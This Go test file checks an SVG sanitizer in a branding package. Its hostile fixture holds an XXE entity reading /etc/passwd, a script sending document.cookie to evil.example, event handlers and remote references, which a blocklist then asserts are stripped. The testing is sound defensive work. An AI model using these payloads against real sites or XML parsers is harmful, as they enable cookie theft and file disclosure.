package branding

import (
	"strings"
	"testing"
)

// TestSanitizeSVGStripsActiveContent is the central security check for ADR 0072: a hostile SVG must not round-trip
// its script, event handlers, external references or DOCTYPE through the sanitizer, while a plain logo survives.
func TestSanitizeSVGStripsActiveContent(t *testing.T) {
	hostile := `<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
     width="300" height="100" viewBox="0 0 300 100" onload="steal()">
  <script>fetch('https://evil.example/' + document.cookie)</script>
  <rect x="0" y="0" width="300" height="100" fill="#123456" onclick="pwn()"/>
  <a xlink:href="https://evil.example"><text x="10" y="20">click</text></a>
  <image href="https://evil.example/track.png" width="1" height="1"/>
  <use xlink:href="https://evil.example/remote.svg#x"/>
  <foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></body></foreignObject>
  <path d="M0 0 L300 0" fill="url(https://evil.example/x)"/>
</svg>`

	out, w, h, err := SanitizeSVG([]byte(hostile))
	if err != nil {
		t.Fatalf("sanitize hostile: %v", err)
	}
	got := strings.ToLower(string(out))

	for _, bad := range []string{
		"<script", "onload", "onclick", "foreignobject", "<image",
		"<a ", "<a>", "evil.example", "file:///", "etc/passwd", "url(", "<!doctype", "<!entity",
	} {
		if strings.Contains(got, bad) {
			t.Errorf("sanitized output still contains %q:\n%s", bad, out)
		}
	}
	// The <use> element may remain, but its remote reference must be gone (handled by the evil.example check above),
	// and the safe geometry must survive.
	if !strings.Contains(got, "<rect") || !strings.Contains(got, "<path") {
		t.Errorf("safe geometry was dropped:\n%s", out)
	}
	if !strings.Contains(got, `fill="#123456"`) {
		t.Errorf("safe fill was dropped:\n%s", out)
	}
	if w != 300 || h != 100 {
		t.Errorf("dimensions = %vx%v, want 300x100", w, h)
	}
}

func TestSanitizeSVGKeepsNormalLogo(t *testing.T) {
	logo := `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 400 120">
  <defs><linearGradient id="g"><stop offset="0" stop-color="#0a0"/><stop offset="1" stop-color="#00a"/></linearGradient></defs>
  <g transform="translate(4,4)">
    <path d="M0 0 H392 V112 H0 Z" fill="url(#g)"/>
    <circle cx="60" cy="56" r="40" fill="#fff" opacity="0.8"/>
    <use href="#g"/>
  </g>
</svg>`
	out, w, h, err := SanitizeSVG([]byte(logo))
	if err != nil {
		t.Fatalf("sanitize logo: %v", err)
	}
	got := string(out)
	for _, want := range []string{"<path", "<circle", "linearGradient", `href="#g"`, `fill="url(#g)"`} {
		if !strings.Contains(got, want) {
			t.Errorf("sanitized logo lost %q:\n%s", want, out)
		}
	}
	if w != 400 || h != 120 {
		t.Errorf("dimensions = %vx%v, want 400x120 from viewBox", w, h)
	}
}

func TestSanitizeSVGRejectsNonSVG(t *testing.T) {
	if _, _, _, err := SanitizeSVG([]byte(`<html><body>no</body></html>`)); err == nil {
		t.Fatal("expected an error for a non-SVG root")
	}
}
